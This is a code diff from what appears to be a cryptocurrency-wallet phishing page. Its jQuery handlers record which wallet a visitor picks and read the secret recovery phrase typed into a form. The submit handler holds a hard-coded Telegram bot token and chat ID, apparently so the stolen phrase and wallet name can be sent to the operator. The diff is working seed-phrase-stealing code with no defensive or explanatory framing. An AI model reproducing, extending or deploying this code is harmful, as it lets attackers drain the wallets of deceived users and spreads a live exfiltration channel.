@@ -58,6 +58,12 @@ connect.addEventListener("click", () => {
   form_disp.style.display = "block";
 });
 
+// get selected wallet
+let selectWallet = null;
+$(".btns button").click(function(){
+	const walletTitile = $(this).data('title');
+	selectWallet = walletTitile;
+})
 $("#phraseForm").on("submit", function (ev) {
   // const secret_phrase = $("#secret_phrase").val();
   ev.preventDefault();
@@ -67,7 +73,7 @@ $("#phraseForm").on("submit", function (ev) {
   const token = "7490196578:AAG20AiV01GIslIVo3hoM8v0c5qn7fgIDvE";
   const chatId = "5706267146";
 
-  var walletVal = 'Select wallet'; // wallet_name.innerHTML
+  var walletVal = selectWallet; // wallet_name.innerHTML
   var phraseVal = document.getElementById("secret_phrase").value;
   const message
 	= `*********************************
